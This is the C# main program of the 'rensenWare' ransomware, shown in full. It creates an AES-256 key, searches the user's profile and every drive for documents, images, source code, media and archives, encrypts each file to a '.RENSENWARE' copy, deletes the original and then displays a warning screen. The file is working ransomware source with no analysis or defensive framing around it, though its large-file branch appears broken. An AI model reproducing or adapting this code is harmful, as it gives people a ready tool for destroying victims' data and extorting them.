using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace rensenWare
{
	internal static class Program
	{
		// File extensions rensenware searches for
		private static readonly string[] targetExtensions = new string[]
		{
			".jpg",  ".txt",
			".png",  ".pdf",
			".hwp",  ".psd",
			".cs",   ".c",
			".cpp",  ".vb",
			".bas",  ".frm",
			".mp3",  ".wav",
			".flac", ".gif",
			".doc",  ".xls",
			".xlsx", ".docx",
			".ppt",  ".pptx",
			".js",   ".avi",
			".mp4",  ".mkv",
			".zip",  ".rar",
			".alz",  ".egg",
			".7z",   ".raw"
		};

		internal static List<string> encryptedFiles = new List<string>();
		
		internal static byte[] randomKey { get; set; }
		internal static readonly string KeyFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomkey.bin";

		internal static byte[] randomIV  { get; set; }
		internal static readonly string IVFilePath  = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomiv.bin";

		[STAThread]
		private static void Main()
		{	// Check if the AES key and IV exist, and run the decryptor form if so
			if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
			{
				Program.randomKey = File.ReadAllBytes(Program.KeyFilePath);
				if (Program.randomKey.Length == 32)
				{
					Program.randomIV = File.ReadAllBytes(Program.IVFilePath);
					if (Program.randomIV.Length == 16)
					{
						Application.Run(new frmManualDecrypter());
						return;
					}
				}
			}

			// If not, begin the main funny vine moment compilation 2015

			Program.randomIV  = new byte[16];
			Program.randomKey = new byte[32];
			
			RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
			rngcryptoServiceProvider.GetBytes(Program.randomIV);  // Generate the IV
			rngcryptoServiceProvider.GetBytes(Program.randomKey); // Generate the key
			
			string[] logicalDrives = Environment.GetLogicalDrives();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			foreach (string zeDrive in logicalDrives)
			{
				if (folderPath.Contains(zeDrive)) // Check if the drive has the windows system folder
				{	// We are most likely a windows drive, search the user's profile folder
					foreach (string path in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\.."))
					{
						try
						{
							foreach (string fileName in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".RENSENWARE");
									}
								}
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					foreach (string fileName in Directory.GetFiles(zeDrive))
					{
						try
						{
							foreach (string fileExt in Program.targetExtensions)
							{
								if (fileName.EndsWith(fileExt))
								{   // Encrypt the file
									Program.Crypt(fileName, false);
									Program.encryptedFiles.Add(fileName + ".RENSENWARE");
								}
							}
						}
						catch
						{
						}
					}

					// Search folders
					foreach (string zeFolders in Directory.GetDirectories(zeDrive))
					{
						try
						{
							foreach (string fileName in Directory.GetFiles(zeFolders, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".RENSENWARE");
									}
								}
							}
						}
						catch
						{
						}
					}
				}
			}

			// Show the main form
			Application.Run(new frmWarning());
		}

		internal static void Crypt(string path, bool IsDecrypt = false)
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.IV          = Program.randomIV;
				rijndaelManaged.Key         = Program.randomKey;
				rijndaelManaged.KeySize     = 256;               // AES-256
				rijndaelManaged.BlockSize   = 128;
				rijndaelManaged.Mode        = CipherMode.CBC;    // CBC mode
				rijndaelManaged.Padding     = PaddingMode.PKCS7;

				ICryptoTransform transform = IsDecrypt ? rijndaelManaged.CreateDecryptor(Program.randomKey, Program.randomIV) : rijndaelManaged.CreateEncryptor(Program.randomKey, Program.randomIV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						byte[] fileData = File.ReadAllBytes(path);
						if ((long)fileData.Length >= 2147483647L) // 2 GB
						{
							while (cryptoStream.Position != (long)fileData.Length - 1L)
							{
								cryptoStream.Write(fileData, 0, 1);
							}
						}
						else
						{
							cryptoStream.Write(fileData, 0, fileData.Length);
						}
					}
                    
					// Create a seperate encrypted file, and delete the original one.
					File.WriteAllBytes(IsDecrypt ? path.Replace(".RENSENWARE", string.Empty) : (path + ".RENSENWARE"), memoryStream.ToArray());
					File.Delete(path);
				}
			}
		}
	}
}
